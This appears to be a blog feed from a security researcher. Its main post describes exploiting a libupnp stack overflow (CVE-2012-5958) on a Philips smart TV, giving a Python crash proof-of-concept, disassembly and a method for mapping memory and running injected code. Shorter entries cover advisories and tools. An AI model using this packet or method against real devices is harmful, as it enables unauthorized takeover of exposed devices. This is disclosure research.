&lt;div style="text-align: justify;"&gt;A network scan reports a running
UPnP service. In January 2013, Rapid7 discovered many
vulnerabilities in libupnp library, v1.6.18. To check if the device
is vulnerable, we send a simple UDP packet that can trigger one of
them (CVE-2012-5958):&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="n"&gt;pkt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NOTIFY * HTTP/1.1&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;HOST: 239.255.255.250:1900&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;USN:uuid:schemas:device:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;512&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:end&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;239.255.255.250&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1900&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;We can see in the console that a
crash occurred:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;03 &amp;lt;2&amp;gt; 001990235 Exception in process 443: SIGSEGV: address not mapped to object
03 &amp;lt;2&amp;gt; 001990235 EPC = 0x41414141
03 &amp;lt;2&amp;gt; 001990235 RA = 0x41414141
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Execution flow has been
redirected to an arbitrary address, so we know this device uses a
vulnerable version of libupnp. Moreover, it indicates there's no
stack-smashing protection.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;In these conditions, exploitation
could be easy if we had had access to this binary&amp;nbsp;or loaded
shared libraries.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;But it's not the case: firmware
updates are encrypted, and there's no public method to get a shell
on this system, at this time.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Unfortunately, the &lt;a href=
"http://sitsec.net/blog/2013/09/16/jointspace-server-directory-traversal-vulnerability-on-a-philips-6000-series-smart-led-tv/"&gt;
path traversal vulnerability found by Martin Schobert&lt;/a&gt; is not
present in our firmware.&lt;/div&gt;

&lt;h2&gt;Memory mapping discovery&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;CVE-2012-5958 is a remote stack
overflow in the "unique_server_name" function. We cross-compile the
same version of libupnp used in the TV set (1.4), for the same
architecture (MIPS32) with the same compiler (GCC 4.2.4).&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Then we disassemble the
vulnerable function :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D4C&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$ra&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x158&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D50&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x154&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D54&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x150&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D58&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x14C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D5C&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x148&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D60&lt;/span&gt;                &lt;span class="no"&gt;jr&lt;/span&gt;      &lt;span class="no"&gt;$ra&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D64&lt;/span&gt;                &lt;span class="no"&gt;addiu&lt;/span&gt;   &lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x160&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D64&lt;/span&gt;  &lt;span class="c1"&gt;# End of function unique_service_name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Function epilogue restores 4
registers (plus $ra) before returning to calling function. The
stack overflow allows to overwrite them with almost arbitrary
values (there's a lot of forbidden bytes).&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Among functions that call
"unique_server_name", the "ssdp_request_type" function uses
registers $s0 &amp; $s1 right after the call return.&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DB4&lt;/span&gt;                 &lt;span class="no"&gt;jalr&lt;/span&gt;    &lt;span class="no"&gt;$t9&lt;/span&gt; &lt;span class="c1"&gt;; unique_service_name&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DB8&lt;/span&gt;                 &lt;span class="no"&gt;move&lt;/span&gt;    &lt;span class="no"&gt;$a1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$s0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DBC&lt;/span&gt;                 &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$gp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x28&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;saved_gp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC0&lt;/span&gt;                 &lt;span class="no"&gt;move&lt;/span&gt;    &lt;span class="no"&gt;$a0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$s1&lt;/span&gt; &lt;span class="c1"&gt;; arg0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC4&lt;/span&gt;                 &lt;span class="no"&gt;la&lt;/span&gt;      &lt;span class="no"&gt;$t9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x49C0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC8&lt;/span&gt;                 &lt;span class="no"&gt;or&lt;/span&gt;      &lt;span class="no"&gt;$at&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$zero&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DCC&lt;/span&gt;                 &lt;span class="no"&gt;jalr&lt;/span&gt;    &lt;span class="no"&gt;$t9&lt;/span&gt; &lt;span class="c1"&gt;; ssdp_request_type1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DD0&lt;/span&gt;                 &lt;span class="no"&gt;sw&lt;/span&gt;      &lt;span class="no"&gt;$zero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$s0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;; write 0 @ $s0+8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Register $s1 is passed as
parameter to the function "ssdp_request_type1", which reads it as a
string pointer.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Register $s0 is dereferenced to
write the null value.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;After that, these registers are
not used anymore until the end of the function where they'll be
restored.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Overwriting saved values of one
of these registers $s0, $s1 and $ra with an arbitrary memory
address can lead to crash the process if this address is not
mapped, or respectively not writable, readable, or
executable.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Crashes can be detected in many
ways:&lt;/div&gt;

&lt;ul&gt;
&lt;li style="text-align: justify;"&gt;denial of service : the process
doesn't answer anymore to UPnP requests&lt;/li&gt;
&lt;li style="text-align: justify;"&gt;specific network activity : the
process broadcasts specific packets at startup&lt;/li&gt;
&lt;li style="text-align: justify;"&gt;crash reports on serial port: from
far the handiest method&lt;/li&gt;
&lt;/ul&gt;

&lt;div style="text-align: justify;"&gt;The observation of process'
behavior allows to deduce if an address is mapped and its
associated permissions.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;By repeating this task in an
automated way, it's possible to discover a part of process' memory
mapping :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00402020-0x00532120   r-x
0x00542020-0x0091af20   rw-
0x0091b020-0x00927efc   ---
0x00928020-0x00930920   rw-
0x00942920-0x00980920+  rwx
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Stability of results indicates
that these memory regions are not randomized. We can see that last
one is a variable-sized executable area. We make the hypothesis
this area is the heap.&lt;/div&gt;

&lt;h2&gt;Injecting arbitrary code&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;We assume that heap is
executable. As libupnp library is open source, we know how UPnP
packets are handled, and which ones are stored in heap
memory.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Thus, we send a custom UPnP
packet to put our arbitrary code at an unknown address in the heap.
No memory corruption involved here.&lt;/div&gt;

&lt;h2&gt;Finding arbitrary code location&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;As we've already said, this stack
overflow allows to arbitrary modify 4 registers ($s0-3) before
returning from the vulnerable function. Right after,
"ssdp_request_type1" function is called with a single argument $a0
copied from $s1, so we can choose its value.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;This function uses its unique
argument as a string pointer and checks if it contains some static
substrings.&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;enum&lt;/span&gt; &lt;span class="n"&gt;SsdpSearchType&lt;/span&gt; &lt;span class="n"&gt;ssdp_request_type1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;strstr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:all&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;NULL&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;SSDP_ALL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;SSDP_SERROR&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If at least one static substrings
is found in the string pointer, the UPnP process will respond to
our request. This behavior lets us know if an arbitrary string
pointer contains a specific substring.&lt;br&gt;
&lt;br&gt;
So we put one of these substrings (":all" for example) in our
arbitrary code, and we use this behavior to search its address in
the heap area (we've already discovered heap start address in a
previous section)&lt;br&gt;
As we need to send many UPnP packets and to monitor responses, this
process takes few minutes.&lt;/p&gt;
&lt;h2&gt;Remote arbitrary code execution&lt;/h2&gt;

&lt;p&gt;We are able to put our arbitrary code in heap memory (executable),
find out its address, and execute it. Thereby, we get shell access
to this system.
We can notice that :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;all processes are root&lt;/li&gt;
&lt;li&gt;stack and heap are executable&lt;/li&gt;
&lt;li&gt;stack is not randomized&lt;/li&gt;
&lt;/ul&gt;
We can also extract &lt;strike&gt;private&lt;/strike&gt; public [0] RSA key to
decrypt firmware updates with &lt;a href="https://fredericb.info/2014/05/pflupg-tool-unpack-philips-smarttv.html"&gt;pflupg-tool&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;[0] Edit 2014/11/14 : Thanks andreashappe for pointing out this
mistake.&lt;/p&gt;</content><category term="mips"></category><category term="smarttv"></category><category term="libupnp"></category><category term="philips"></category><category term="exploit"></category></entry><entry><title>pflupg-tool : unpack Philips SmartTV firmware</title><link href="https://fredericb.info/2014/05/pflupg-tool-unpack-philips-smarttv.html" rel="alternate"></link><published>2014-05-16T07:28:00-07:00</published><updated>2014-05-16T07:28:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-16:/2014/05/pflupg-tool-unpack-philips-smarttv.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/frederic/pflupg-tool"&gt;pflupg-tool&lt;/a&gt; is an
unpacking tool for Philips SmartTV firmware (Fusion platform). If
your firmware is encrypted, you have to provide the corresponding
public key (public exponent&amp;nbsp;+ modulus).&lt;br&gt;
&lt;br&gt;
You can add public keys in pflupg.h file:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define PUBLIC_KEYS_CNT 2&lt;/span&gt;
&lt;span class="c1"&gt;// { name, public exponent e (hex string), modulus n (hex string)}&lt;/span&gt;
&lt;span class="k"&gt;static …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://github.com/frederic/pflupg-tool"&gt;pflupg-tool&lt;/a&gt; is an
unpacking tool for Philips SmartTV firmware (Fusion platform). If
your firmware is encrypted, you have to provide the corresponding
public key (public exponent&amp;nbsp;+ modulus).&lt;br&gt;
&lt;br&gt;
You can add public keys in pflupg.h file:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define PUBLIC_KEYS_CNT 2&lt;/span&gt;
&lt;span class="c1"&gt;// { name, public exponent e (hex string), modulus n (hex string)}&lt;/span&gt;
&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;public_keys&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;PUBLIC_KEYS_CNT&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;my_key_1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010001&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;AABBCCDD&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;my_key_2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010001&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010E020F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Usage: ./pflupg &amp;lt;upg_filename&amp;gt; [key_name]
2 keys available :
* my_key_1
* my_key_2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Source code can be found on &lt;a href=
"https://github.com/frederic/pflupg-tool"&gt;GitHub&lt;/a&gt;. You'll need
&lt;a href="https://www.gnu.org/software/libgcrypt/"&gt;Libgcrypt
library&lt;/a&gt;&amp;nbsp;to compile it.&lt;/p&gt;</content><category term="mips"></category><category term="smarttv"></category><category term="firmware"></category><category term="philips"></category></entry><entry><title>[CVE-2014-2978] DirectFB remote out-of-bounds write vulnerability</title><link href="https://fredericb.info/2014/05/cve-2014-2978-directfb-remote-out-of.html" rel="alternate"></link><published>2014-05-15T16:09:00-07:00</published><updated>2014-05-15T16:09:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/cve-2014-2978-directfb-remote-out-of.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an out-of-bound write vulnerability since version
1.4.4.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
An attacker can choose to overflow in the heap or the stack.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an out-of-bound write vulnerability since version
1.4.4.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
An attacker can choose to overflow in the heap or the stack.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: None&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Integrity Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2014-03-27 Developer notified&lt;/li&gt;
&lt;li&gt;2014-04-21 CVE-2014-2978 assigned&lt;/li&gt;
&lt;li&gt;2014-05-16 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://www.directfb.org/&lt;/li&gt;
&lt;li&gt;http://mail.directfb.org/pipermail/directfb-dev/2014-March/006805.html&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>[CVE-2014-2977] DirectFB integer signedness vulnerability</title><link href="https://fredericb.info/2014/05/cve-2014-2977-directfb-integer.html" rel="alternate"></link><published>2014-05-15T16:05:00-07:00</published><updated>2014-05-15T16:05:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/cve-2014-2977-directfb-integer.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an integer signedness vulnerability since
version 1.4.13.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
This integer coercion error may lead to a stack overflow.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an integer signedness vulnerability since
version 1.4.13.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
This integer coercion error may lead to a stack overflow.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: None&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Integrity Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2014-03-27 Developer notified&lt;/li&gt;
&lt;li&gt;2014-04-21 CVE-2014-2977 assigned&lt;/li&gt;
&lt;li&gt;2014-05-16 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://www.directfb.org/&lt;/li&gt;
&lt;li&gt;http://mail.directfb.org/pipermail/directfb-dev/2014-March/006805.html&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>dfb-wireshark-dissector : DirectFB Voodoo protocol dissector for Wireshark</title><link href="https://fredericb.info/2014/05/dfb-wireshark-dissector-directfb-voodoo.html" rel="alternate"></link><published>2014-05-15T15:48:00-07:00</published><updated>2014-05-15T15:48:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/dfb-wireshark-dissector-directfb-voodoo.html</id><summary type="html">&lt;p&gt;&lt;a href="http://directfb.org/index.php?path=Platform/Voodoo"&gt;Voodoo&lt;/a&gt;&amp;nbsp;is the network layer of &lt;a href="http://directfb.org/"&gt;DirectFB&lt;/a&gt;. &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;dfb-wireshark-dissector&lt;/a&gt; is a Wireshark plugin to dissect this protocol.&lt;br /&gt;Main features are :&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Both packet &amp;amp; raw modes are supported ;&lt;/li&gt;&lt;li&gt;FLZ decompression ;&lt;/li&gt;&lt;li&gt;Instance ID resolution.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;Source code can be found on &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;Github&lt;/a&gt;.&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://directfb.org/index.php?path=Platform/Voodoo"&gt;Voodoo&lt;/a&gt;&amp;nbsp;is the network layer of &lt;a href="http://directfb.org/"&gt;DirectFB&lt;/a&gt;. &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;dfb-wireshark-dissector&lt;/a&gt; is a Wireshark plugin to dissect this protocol.&lt;br /&gt;Main features are :&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Both packet &amp;amp; raw modes are supported ;&lt;/li&gt;&lt;li&gt;FLZ decompression ;&lt;/li&gt;&lt;li&gt;Instance ID resolution.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;Source code can be found on &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;Github&lt;/a&gt;.&lt;/p&gt;</content><category term="tool"></category><category term="wireshark"></category><category term="directfb"></category></entry><entry><title>Axis Camera M1011 Remote Code Execution Exploit</title><link href="https://fredericb.info/2013/07/axis-camera-m1011-remote-code-execution.html" rel="alternate"></link><published>2013-07-31T08:22:00-07:00</published><updated>2013-07-31T08:22:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-31:/2013/07/axis-camera-m1011-remote-code-execution.html</id><summary type="html">&lt;p&gt;In January 2013, &lt;a href="https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"&gt;Rapid7 published&lt;/a&gt; a &lt;a href="https://community.rapid7.com/docs/DOC-2150"&gt;great paper&lt;/a&gt; describing several vulnerabilities in the most common UPnP libraries.
Six months later, many devices based on these libraries have not been updated and are still exposed.&lt;/p&gt;
